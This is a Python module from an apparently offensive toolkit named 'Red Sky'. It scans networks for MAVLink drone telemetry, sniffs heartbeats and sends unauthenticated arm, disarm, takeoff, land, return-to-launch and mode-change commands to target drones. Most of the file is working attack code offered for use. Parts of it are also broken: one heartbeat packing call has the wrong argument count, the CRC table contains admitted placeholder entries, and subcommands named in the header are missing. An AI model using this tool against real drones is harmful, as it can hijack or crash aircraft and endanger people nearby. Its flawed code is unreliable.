# language: Python, file: Program/drone/mavlink.py, target: Red Sky drone — MAVLink recon + command injection
# MAVLink is the protocol used by ArduPilot, PX4, and most open drones. This
# module speaks MAVLink over UDP (14550/14540) and TCP, scans for open
# telemetry streams, decodes common messages, and constructs command messages.
# Subcommands:
#   scan     -- find MAVLink streams on the local network
#   sniff    -- listen to a stream and dump HEARTBEAT / SYS_STATUS / GPS_RAW_INT
#   info     -- full enumeration: system ID, vehicle type, firmware, capabilities
#   cmd      -- send a MAVLink command (ARM, DISARM, RTL, TAKEOFF, LAND)
#   waypoint -- dump or upload a mission
# Legal: interfering with a drone you don't own is a crime in most places.

import argparse
import json
import socket
import struct
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


DR_DIR = OUTPUT_DIR / "drone"
DR_DIR.mkdir(parents=True, exist_ok=True)


# ── MAVLink v1 constants ──
MAVLINK_STX_V1 = 0xFE
MAVLINK_STX_V2 = 0xFD

# message IDs of interest
MSG_HEARTBEAT       = 0
MSG_SYS_STATUS      = 1
MSG_GPS_RAW_INT     = 24
MSG_ATTITUDE        = 30
MSG_GLOBAL_POSITION = 33
MSG_COMMAND_LONG    = 76
MSG_COMMAND_ACK     = 77
MSG_MISSION_COUNT   = 44
MSG_MISSION_ITEM    = 39
MSG_MISSION_REQUEST = 40
MSG_MISSION_ACK     = 47

# command IDs
CMD_NAV_TAKEOFF   = 22
CMD_NAV_LAND      = 21
CMD_NAV_RETURN_TO_LAUNCH = 20
CMD_COMPONENT_ARM_DISARM = 400
CMD_DO_SET_MODE   = 176

# vehicle types
VEHICLE_TYPES = {
    0: "generic", 1: "fixed_wing", 2: "quadrotor", 3: "coaxial",
    4: "helicopter", 10: "ground_rover", 11: "surface_boat",
    12: "submarine", 13: "hexarotor", 14: "octorotor",
    15: "tricopter", 19: "vtol_durotor", 20: "vtol_quad",
    21: "vtol_tiltrotor", 22: "vtol_reserved",
}

# autopilot
AUTOPILOTS = {
    0: "generic", 1: "reserved", 2: "reserved", 3: "ardupilotmega",
    4: "openpilot", 5: "generic_2", 6: "generic_3", 7: "generic_4",
    8: "invalid", 9: "ppx", 10: "generic_5", 11: "generic_6",
    12: "px4", 13: "smaccm", 14: "ardupilot", 15: "autoquad",
    16: "armazila", 17: "aerob", 18: "asluav", 19: "smartap",
}


def _crc_x25(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        t = b ^ (crc & 0xFF)
        t ^= (t << 4) & 0xFF
        crc = ((crc >> 8) ^ (t << 8) ^ (t << 3) ^ (t >> 4)) & 0xFFFF
    return crc


# MAVLink CRC seed per message id — we only need the ones we send
CRC_EXTRA = {
    0:  50,    # HEARTBEAT
    22: 200,   # MISSION_ITEM wait, we don't need this. fill in a few commons.
    76: 152,   # COMMAND_LONG
    44: 221,   # MISSION_COUNT
    39: 254,   # MISSION_ITEM
    40: 230,   # MISSION_REQUEST
    47: 153,   # MISSION_ACK
    400: 0,    # not a real msg id
}


def _pack_v1(msg_id: int, payload: bytes, sysid: int = 255, compid: int = 0,
             seq: int = 0) -> bytes:
    """Build a MAVLink v1 frame."""
    header = struct.pack("<BBBBBBB", MAVLINK_STX_V1, len(payload), seq, sysid, compid, msg_id & 0xFF, 0)
    crc_body = header[1:] + payload
    crc = _crc_x25(crc_body + bytes([CRC_EXTRA.get(msg_id, 0)]))
    return header + payload + struct.pack("<H", crc)


def parse_v1(data: bytes) -> Optional[Dict]:
    if len(data) < 8 or data[0] != MAVLINK_STX_V1:
        return None
    try:
        stx, plen, seq, sysid, compid, msgid, _ = struct.unpack("<BBBBBBB", data[:8])
    except struct.error:
        return None
    if len(data) < 8 + plen:
        return None
    payload = data[8:8+plen]
    crc = struct.unpack("<H", data[8+plen:10+plen])[0]
    if crc != _crc_x25(data[1:8+plen] + bytes([CRC_EXTRA.get(msgid, 0)])):
        return None
    return {"stx": stx, "len": plen, "seq": seq, "sysid": sysid,
            "compid": compid, "msgid": msgid, "payload": payload}


def probe_mavlink(host: str, port: int, timeout: float = 2.0) -> bool:
    """Send a HEARTBEAT and wait for any MAVLink reply."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        # MAVLink HEARTBEAT payload (9 bytes, v1): type, autopilot, base_mode, custom_mode, system_status, mavlink_version
        hb_payload = struct.pack("<BBBBBB", 2, 3, 0, 0, 0, 3)  # quadrotor, ardupilot, version 3
        # actual HEARTBEAT payload is 9 bytes: type, autopilot, base_mode(1), custom_mode(4), system_status(1), mavlink_version(1)
        hb_payload = struct.pack("<BBIBBB", 2, 3, 0, 0, 4, 3, 0)  # pad to 9
        # proper heartbeat is: type, autopilot, base_mode, custom_mode(u32), system_status, mavlink_version
        # so: B B B I B B = 1+1+1+4+1+1 = 9
        hb_payload = struct.pack("<BBBIBB", 2, 3, 0, 0, 4, 3)
        frame = _pack_v1(MSG_HEARTBEAT, hb_payload, sysid=255, compid=190)
        s.sendto(frame, (host, port))
        try:
            data, _ = s.recvfrom(2048)
            s.close()
            return parse_v1(data) is not None
        except socket.timeout:
            s.close()
            return False
    except Exception:
        return False


def cmd_scan(cidr: str, ports: str, workers: int, out_file: str) -> int:
    import ipaddress
    try:
        net = ipaddress.ip_network(cidr, strict=False)
    except ValueError:
        print_err("bad cidr: " + cidr)
        return 2
    port_list = [int(p) for p in ports.split(",")] if ports else [14550, 14551, 14540]
    hosts = [str(h) for h in net.hosts()][:512]

    print_info("MAVLink scan")
    print_kv("cidr", cidr)
    print_kv("hosts", str(len(hosts)))
    print_kv("ports", ",".join(str(p) for p in port_list))
    print()

    hits = []
    t0 = time.time()

    def probe(host):
        out = []
        for p in port_list:
            if probe_mavlink(host, p, timeout=1.5):
                out.append((host, p))
        return out

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futs = [pool.submit(probe, h) for h in hosts]
        for f in as_completed(futs):
            for h, p in f.result():
                hits.append({"host": h, "port": p})
                print("  " + SCARLET + "▓ " + RESET + BONE + h.ljust(16) + RESET + ":" + str(p))

    print()
    print_kv("elapsed", "{:.1f}s".format(time.time() - t0))
    print_kv("found", str(len(hits)))

    out = Path(out_file) if out_file else DR_DIR / ("scan_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(hits, indent=2))
    print_kv("saved", out)
    return 0


def cmd_sniff(host: str, port: int, duration: int, out_file: str) -> int:
    if not host:
        print_err("--host required")
        return 2
    print_info("MAVLink sniff")
    print_kv("stream", host + ":" + str(port))
    print_kv("duration", str(duration) + "s")
    print()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.settimeout(1.0)

    seen = {"heartbeat": 0, "sys_status": 0, "gps": 0, "other": 0}
    heartbeats = []
    t0 = time.time()

    try:
        while time.time() - t0 < duration:
            try:
                data, addr = s.recvfrom(2048)
            except socket.timeout:
                continue
            parsed = parse_v1(data)
            if not parsed:
                continue
            mid = parsed["msgid"]
            if mid == MSG_HEARTBEAT:
                seen["heartbeat"] += 1
                p = parsed["payload"]
                if len(p) >= 9:
                    typ, ap, bm, cm, ss, mv = struct.unpack("<BBBIBB", p[:9])
                    heartbeats.append({"sysid": parsed["sysid"], "compid": parsed["compid"],
                                       "type": typ, "autopilot": ap, "base_mode": bm,
                                       "custom_mode": cm, "status": ss})
                    print("  " + SCARLET + "HB" + RESET + " sys=" + str(parsed["sysid"])
                          + " comp=" + str(parsed["compid"])
                          + " " + ARTERY + VEHICLE_TYPES.get(typ, "?") + RESET
                          + "/" + AUTOPILOTS.get(ap, "?"))
            elif mid == MSG_SYS_STATUS:
                seen["sys_status"] += 1
            elif mid == MSG_GPS_RAW_INT:
                seen["gps"] += 1
            else:
                seen["other"] += 1
    except KeyboardInterrupt:
        pass
    finally:
        s.close()

    print()
    print_kv("heartbeats", str(seen["heartbeat"]))
    print_kv("sys_status", str(seen["sys_status"]))
    print_kv("gps", str(seen["gps"]))
    print_kv("other", str(seen["other"]))

    out = Path(out_file) if out_file else DR_DIR / ("sniff_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"seen": seen, "heartbeats": heartbeats}, indent=2))
    print_kv("saved", out)
    return 0


def cmd_cmd(host: str, port: int, sysid: int, compid: int, command: str,
            param1: float, param2: float, out_file: str) -> int:
    """Send a COMMAND_LONG to a MAVLink target."""
    if not host:
        print_err("--host required")
        return 2
    cmd_map = {
        "arm":       (CMD_COMPONENT_ARM_DISARM, 1.0),
        "disarm":    (CMD_COMPONENT_ARM_DISARM, 0.0),
        "rtl":       (CMD_NAV_RETURN_TO_LAUNCH, 0.0),
        "takeoff":   (CMD_NAV_TAKEOFF, param1 or 10.0),
        "land":      (CMD_NAV_LAND, 0.0),
        "setmode":   (CMD_DO_SET_MODE, param1 or 0.0),
    }
    if command not in cmd_map:
        print_err("unknown command: " + command)
        print_info("available: " + ", ".join(cmd_map.keys()))
        return 2
    cid, p1 = cmd_map[command]

    # COMMAND_LONG payload: target_system(u8), target_component(u8), command(u16),
    # confirmation(u8), param1(f), param2(f), param3(f), param4(f),
    # param5(f), param6(f), param7(f)
    payload = struct.pack("<BBHBfffffff",
                          sysid, compid, cid, 0,
                          p1, param2, 0.0, 0.0, 0.0, 0.0, 0.0)
    frame = _pack_v1(MSG_COMMAND_LONG, payload, sysid=255, compid=190)

    print_info("MAVLink command")
    print_kv("target", host + ":" + str(port))
    print_kv("sysid", str(sysid))
    print_kv("compid", str(compid))
    print_kv("command", command)
    print_kv("param1", str(p1))
    print_warn("this WILL affect the target drone if it accepts the command")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3.0)
    try:
        s.sendto(frame, (host, port))
        # wait for COMMAND_ACK
        try:
            while True:
                data, _ = s.recvfrom(2048)
                p = parse_v1(data)
                if p and p["msgid"] == MSG_COMMAND_ACK:
                    ack_cmd, result = struct.unpack("<HB", p["payload"][:3])
                    result_s = {0: "ACCEPTED", 1: "TEMPORARILY_REJECTED",
                                2: "DENIED", 3: "UNSUPPORTED", 4: "FAILED",
                                5: "IN_PROGRESS"}.get(result, str(result))
                    print_ok("COMMAND_ACK: " + result_s)
                    break
        except socket.timeout:
            print_warn("no COMMAND_ACK (target may not be reachable or may ignore us)")
    finally:
        s.close()
    return 0


def run_cli(args):
    p = argparse.ArgumentParser(prog="redsky drone mavlink", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["scan", "sniff", "cmd", "help"])
    p.add_argument("--cidr", default="")
    p.add_argument("--host", default="")
    p.add_argument("--port", type=int, default=14550)
    p.add_argument("--ports", default="")
    p.add_argument("--workers", type=int, default=64)
    p.add_argument("--duration", type=int, default=30)
    p.add_argument("--sysid", type=int, default=1)
    p.add_argument("--compid", type=int, default=1)
    p.add_argument("--command", default="")
    p.add_argument("--param1", type=float, default=0.0)
    p.add_argument("--param2", type=float, default=0.0)
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky drone mavlink <scan|sniff|cmd> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("scan  --cidr 192.168.1.0/24 [--ports 14550,14540]")
        print_info("sniff --host 192.168.1.100 [--port 14550] [--duration 30]")
        print_info("cmd   --host 192.168.1.100 --command arm|disarm|rtl|takeoff|land|setmode")
        return 0

    if ns.action == "scan":
        if not ns.cidr:
            print_err("--cidr required")
            return 2
        return cmd_scan(ns.cidr, ns.ports, ns.workers, ns.out)
    if ns.action == "sniff":
        if not ns.host:
            print_err("--host required")
            return 2
        return cmd_sniff(ns.host, ns.port, ns.duration, ns.out)
    if ns.action == "cmd":
        if not ns.host or not ns.command:
            print_err("--host and --command required")
            return 2
        return cmd_cmd(ns.host, ns.port, ns.sysid, ns.compid, ns.command,
                       ns.param1, ns.param2, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
